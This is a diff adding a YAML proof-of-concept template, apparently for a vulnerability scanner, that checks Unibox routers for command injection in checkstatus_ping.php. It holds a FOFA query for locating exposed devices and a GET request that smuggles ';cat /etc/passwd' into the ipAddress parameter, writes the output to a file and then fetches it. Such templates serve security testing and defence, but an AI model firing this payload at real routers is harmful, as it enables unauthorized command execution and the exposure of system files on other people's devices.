@@ -1,0 +1,19 @@
+id: poc-yaml-unibox-router-checkstatus-ping-php-command-injection
+info:
+  name: Unibox路由器 checkstatus_ping.php 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: unibox_administration
+  fofa: body="Unibox" && body="Controller" || body="www.wifi-soft.com"
+variables:
+  t1: random_str(5)
+requests:
+- method: GET
+  path: /network/checkstatus_ping.php?ipAddress=;cat%20/etc/passwd>{{.t1}}.txt;
+  expression: status_code == 200 && contains(body,"statusdate")
+- method: GET
+  path: /network/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
